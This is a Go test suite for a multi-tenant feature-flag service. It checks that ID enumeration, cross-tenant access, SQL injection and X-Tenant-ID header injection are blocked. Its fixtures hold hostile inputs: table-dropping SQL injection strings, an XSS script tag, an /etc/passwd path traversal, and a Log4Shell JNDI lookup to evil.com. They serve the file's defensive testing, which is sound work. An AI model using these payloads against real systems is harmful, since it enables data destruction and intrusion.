package security_test

import (
	"context"
	"database/sql"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"testing"

	"github.com/gin-gonic/gin"
	flagspkg "github.com/jalil32/toggle/internal/flags"
	"github.com/jalil32/toggle/internal/middleware"
	pkgcontext "github.com/jalil32/toggle/internal/pkg/context"
	"github.com/jalil32/toggle/internal/pkg/transaction"
	"github.com/jalil32/toggle/internal/projects"
	"github.com/jalil32/toggle/internal/tenants"
	"github.com/jalil32/toggle/internal/testutil"
	"github.com/jmoiron/sqlx"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestMain(m *testing.M) {
	ctx := context.Background()

	_, err := testutil.SetupTestDatabase(ctx, "../../migrations")
	if err != nil {
		panic(err)
	}

	code := m.Run()

	if err := testutil.TeardownTestDatabase(ctx); err != nil {
		panic(err)
	}

	os.Exit(code)
}

// TestIDEnumeration_InvalidProjectID_ReturnsConsistentError tests that
// attempting to access a non-existent project returns sql.ErrNoRows
// rather than leaking information about whether the project exists
func TestIDEnumeration_InvalidProjectID_ReturnsConsistentError(t *testing.T) {
	testutil.WithTestDB(t, func(ctx context.Context, tx *sqlx.Tx) {
		// Setup: Create tenant with one project
		tenant := testutil.CreateTenant(t, tx, "Test Tenant", "test-tenant")
		project := testutil.CreateProject(t, tx, tenant.ID, "Real Project", "api-key-123")

		repo := projects.NewRepository(testutil.GetTestDB())
		ctx = transaction.InjectTx(ctx, tx)

		// Test 1: Valid project for valid tenant - should succeed
		retrieved, err := repo.GetByID(ctx, project.ID, tenant.ID)
		require.NoError(t, err)
		assert.Equal(t, project.ID, retrieved.ID)

		// Test 2: Invalid project ID (non-existent UUID)
		fakeProjectID := "00000000-0000-0000-0000-000000000000"
		retrieved, err = repo.GetByID(ctx, fakeProjectID, tenant.ID)

		// Assert: Should return sql.ErrNoRows (not 403 Forbidden or different error)
		require.Error(t, err)
		assert.ErrorIs(t, err, sql.ErrNoRows, "Non-existent project should return sql.ErrNoRows")
		assert.Nil(t, retrieved)

		// Test 3: Valid project ID but wrong tenant (cross-tenant attack)
		tenant2 := testutil.CreateTenant(t, tx, "Other Tenant", "other-tenant")
		retrieved, err = repo.GetByID(ctx, project.ID, tenant2.ID)

		// Assert: Should return same error as non-existent project
		require.Error(t, err)
		assert.ErrorIs(t, err, sql.ErrNoRows, "Cross-tenant access should return sql.ErrNoRows (same as non-existent)")
		assert.Nil(t, retrieved)
	})
}

// TestIDEnumeration_InvalidFlagID_ReturnsConsistentError tests flag ID enumeration prevention
func TestIDEnumeration_InvalidFlagID_ReturnsConsistentError(t *testing.T) {
	testutil.WithTestDB(t, func(ctx context.Context, tx *sqlx.Tx) {
		// Setup
		tenant := testutil.CreateTenant(t, tx, "Test Tenant", "test-tenant")
		project := testutil.CreateProject(t, tx, tenant.ID, "Project", "api-key")
		flag := testutil.CreateFlag(t, tx, tenant.ID, &project.ID, "real-flag", "Real Flag", true)

		repo := flagspkg.NewRepository(testutil.GetTestDB())
		ctx = transaction.InjectTx(ctx, tx)

		// Test 1: Valid flag - should succeed
		retrieved, err := repo.GetByID(ctx, flag.ID, tenant.ID)
		require.NoError(t, err)
		assert.Equal(t, flag.ID, retrieved.ID)

		// Test 2: Non-existent flag ID
		fakeFlagID := "00000000-0000-0000-0000-000000000000"
		retrieved, err = repo.GetByID(ctx, fakeFlagID, tenant.ID)
		require.Error(t, err)
		assert.ErrorIs(t, err, sql.ErrNoRows)
		assert.Nil(t, retrieved)

		// Test 3: Valid flag but wrong tenant
		tenant2 := testutil.CreateTenant(t, tx, "Other Tenant", "other-tenant")
		retrieved, err = repo.GetByID(ctx, flag.ID, tenant2.ID)
		require.Error(t, err)
		assert.ErrorIs(t, err, sql.ErrNoRows, "Should return same error to prevent enumeration")
		assert.Nil(t, retrieved)
	})
}

// TestSQLInjection_ProjectName_IsSafelyHandled tests that SQL injection
// attempts in project names are safely handled by parameterized queries
func TestSQLInjection_ProjectName_IsSafelyHandled(t *testing.T) {
	testutil.WithTestDB(t, func(ctx context.Context, tx *sqlx.Tx) {
		tenant := testutil.CreateTenant(t, tx, "Test Tenant", "test-tenant")

		repo := projects.NewRepository(testutil.GetTestDB())
		ctx = transaction.InjectTx(ctx, tx)

		// SQL injection payloads
		maliciousNames := []string{
			"'; DROP TABLE projects; --",
			"' OR '1'='1",
			"admin'--",
			"' UNION SELECT * FROM users--",
			"1'; DELETE FROM flags WHERE '1'='1",
		}

		for _, maliciousName := range maliciousNames {
			// Attempt to create project with SQL injection payload
			project, err := repo.Create(ctx, tenant.ID, maliciousName)

			// Should succeed - the malicious string is treated as literal text
			require.NoError(t, err, "Parameterized query should handle SQL injection safely")
			require.NotNil(t, project)

			// Verify the malicious string is stored as-is (not executed)
			assert.Equal(t, maliciousName, project.Name, "Name should be stored literally")

			// Verify database is intact - we can still query
			retrieved, err := repo.GetByID(ctx, project.ID, tenant.ID)
			require.NoError(t, err, "Database should still be functional")
			assert.Equal(t, maliciousName, retrieved.Name)
		}

		// Verify projects table still exists and works
		projects, err := repo.ListByTenantID(ctx, tenant.ID)
		require.NoError(t, err, "Projects table should still exist")
		assert.Len(t, projects, len(maliciousNames), "All malicious names should be stored safely")
	})
}

// TestSQLInjection_FlagDescription_IsSafelyHandled tests SQL injection in flag descriptions
func TestSQLInjection_FlagDescription_IsSafelyHandled(t *testing.T) {
	testutil.WithTestDB(t, func(ctx context.Context, tx *sqlx.Tx) {
		tenant := testutil.CreateTenant(t, tx, "Test Tenant", "test-tenant")
		project := testutil.CreateProject(t, tx, tenant.ID, "Project", "api-key")

		repo := flagspkg.NewRepository(testutil.GetTestDB())
		ctx = transaction.InjectTx(ctx, tx)

		maliciousDescriptions := []string{
			"'; UPDATE flags SET enabled = true; --",
			"' OR 1=1; DROP TABLE tenants; --",
			"<script>alert('xss')</script>'; DELETE FROM projects; --",
		}

		for i, maliciousDesc := range maliciousDescriptions {
			flag := &flagspkg.Flag{
				TenantID:    tenant.ID,
				Name:        "flag-" + string(rune('a'+i)),
				Description: maliciousDesc,
				Enabled:     false,
				ProjectID:   &project.ID,
				Rules:       []flagspkg.Rule{},
				RuleLogic:   "AND",
			}

			err := repo.Create(ctx, flag)
			require.NoError(t, err, "Should handle SQL injection in description safely")

			// Verify description is stored literally
			retrieved, err := repo.GetByID(ctx, flag.ID, tenant.ID)
			require.NoError(t, err)
			assert.Equal(t, maliciousDesc, retrieved.Description)
		}

		// Verify database integrity
		flags, err := repo.ListByProject(ctx, project.ID, tenant.ID)
		require.NoError(t, err)
		assert.Len(t, flags, len(maliciousDescriptions))
	})
}

// TestSQLInjection_TenantSlug_IsSafelyHandled tests SQL injection in tenant slugs
func TestSQLInjection_TenantSlug_IsSafelyHandled(t *testing.T) {
	testutil.WithTestDB(t, func(ctx context.Context, tx *sqlx.Tx) {
		repo := tenants.NewRepository(testutil.GetTestDB())
		ctx = transaction.InjectTx(ctx, tx)

		// Note: Some of these might fail due to slug format validation,
		// but they should NOT cause SQL injection
		maliciousSlugs := []string{
			"valid-slug'; DROP TABLE tenants; --",
			"slug' OR '1'='1",
		}

		for _, maliciousSlug := range maliciousSlugs {
			tenant, err := repo.Create(ctx, "Test Tenant", maliciousSlug)

			if err == nil {
				// If creation succeeds, verify slug is stored literally
				require.NotNil(t, tenant)
				assert.Equal(t, maliciousSlug, tenant.Slug)

				// Verify we can retrieve it
				retrieved, err := repo.GetBySlug(ctx, maliciousSlug)
				require.NoError(t, err)
				assert.Equal(t, maliciousSlug, retrieved.Slug)
			}
			// If it fails, that's fine - slug validation is working
			// The important thing is it doesn't cause SQL injection
		}

		// Verify tenants table still exists
		exists, err := repo.SlugExists(ctx, "some-slug")
		require.NoError(t, err, "Tenants table should still be functional")
		assert.False(t, exists)
	})
}

// TestHeaderInjection_MaliciousTenantID_IsRejected tests that malicious
// X-Tenant-ID headers are properly rejected by middleware
func TestHeaderInjection_MaliciousTenantID_IsRejected(t *testing.T) {
	db := testutil.GetTestDB()
	tenantRepo := tenants.NewRepository(db)

	testutil.WithTestDB(t, func(ctx context.Context, cleanupTx *sqlx.Tx) {
		// Setup: Create user and tenant
		setupTx, err := db.Beginx()
		require.NoError(t, err)
		user := testutil.CreateUser(t, setupTx, "Test User", "user@example.com")
		tenant := testutil.CreateTenant(t, setupTx, "Test Tenant", "test-tenant")
		testutil.CreateTenantMember(t, setupTx, user.ID, tenant.ID, "admin")
		require.NoError(t, setupTx.Commit())

		// Setup router with tenant middleware
		gin.SetMode(gin.TestMode)
		router := gin.New()
		logger := slog.New(slog.NewTextHandler(io.Discard, nil))
		router.Use(middleware.Tenant(tenantRepo, logger))
		router.GET("/test", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"status": "ok"})
		})

		maliciousTenantIDs := []string{
			"'; DROP TABLE tenants; --",
			"<script>alert('xss')</script>",
			"../../../etc/passwd",
			"${jndi:ldap://evil.com/a}",
			"' OR '1'='1",
			"not-a-uuid",
			"12345",
			"",
		}

		for _, maliciousID := range maliciousTenantIDs {
			req := httptest.NewRequest("GET", "/test", nil)
			req.Header.Set("X-Tenant-ID", maliciousID)

			// Inject user context
			reqCtx := pkgcontext.WithAuth(req.Context(), user.ID, "", "")
			req = req.WithContext(reqCtx)

			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			// Assert: Should be rejected (not 200 OK)
			assert.NotEqual(t, http.StatusOK, w.Code,
				"Malicious tenant ID should be rejected: %s", maliciousID)
			assert.True(t, w.Code == http.StatusBadRequest || w.Code == http.StatusForbidden,
				"Should return 400 or 403, got %d for: %s", w.Code, maliciousID)
		}

		// Cleanup
		_, _ = db.Exec("DELETE FROM tenant_members WHERE user_id = $1", user.ID)
		_, _ = db.Exec("DELETE FROM tenants WHERE id = $1", tenant.ID)
		_, _ = db.Exec("DELETE FROM users WHERE id = $1", user.ID)
	})
}

// TestHeaderInjection_ValidTenantID_StillWorks verifies that valid UUIDs work
func TestHeaderInjection_ValidTenantID_StillWorks(t *testing.T) {
	db := testutil.GetTestDB()
	tenantRepo := tenants.NewRepository(db)

	testutil.WithTestDB(t, func(ctx context.Context, cleanupTx *sqlx.Tx) {
		setupTx, err := db.Beginx()
		require.NoError(t, err)
		user := testutil.CreateUser(t, setupTx, "Test User", "user@example.com")
		tenant := testutil.CreateTenant(t, setupTx, "Test Tenant", "test-tenant")
		testutil.CreateTenantMember(t, setupTx, user.ID, tenant.ID, "admin")
		require.NoError(t, setupTx.Commit())

		gin.SetMode(gin.TestMode)
		router := gin.New()
		logger := slog.New(slog.NewTextHandler(io.Discard, nil))
		router.Use(middleware.Tenant(tenantRepo, logger))
		router.GET("/test", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"status": "ok"})
		})

		// Test with valid UUID
		req := httptest.NewRequest("GET", "/test", nil)
		req.Header.Set("X-Tenant-ID", tenant.ID)
		reqCtx := pkgcontext.WithAuth(req.Context(), user.ID, "", "")
		req = req.WithContext(reqCtx)

		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusOK, w.Code, "Valid tenant ID should work")

		// Cleanup
		_, _ = db.Exec("DELETE FROM tenant_members WHERE user_id = $1", user.ID)
		_, _ = db.Exec("DELETE FROM tenants WHERE id = $1", tenant.ID)
		_, _ = db.Exec("DELETE FROM users WHERE id = $1", user.ID)
	})
}

// TestMassAssignment_CannotModifyTenantID tests that users cannot modify
// tenant_id or other protected fields via input manipulation
func TestMassAssignment_CannotModifyTenantID(t *testing.T) {
	testutil.WithTestDB(t, func(ctx context.Context, tx *sqlx.Tx) {
		tenant1 := testutil.CreateTenant(t, tx, "Tenant 1", "tenant-1")
		tenant2 := testutil.CreateTenant(t, tx, "Tenant 2", "tenant-2")

		repo := projects.NewRepository(testutil.GetTestDB())
		ctx = transaction.InjectTx(ctx, tx)

		// Create project in tenant1
		project, err := repo.Create(ctx, tenant1.ID, "My Project")
		require.NoError(t, err)
		assert.Equal(t, tenant1.ID, project.TenantID)

		// Attempt to retrieve as tenant2 (should fail)
		retrieved, err := repo.GetByID(ctx, project.ID, tenant2.ID)
		assert.Error(t, err)
		assert.ErrorIs(t, err, sql.ErrNoRows, "Should not be able to access project from different tenant")
		assert.Nil(t, retrieved)

		// Verify project still belongs to tenant1
		retrieved, err = repo.GetByID(ctx, project.ID, tenant1.ID)
		require.NoError(t, err)
		assert.Equal(t, tenant1.ID, retrieved.TenantID, "Tenant ID should be immutable")
	})
}
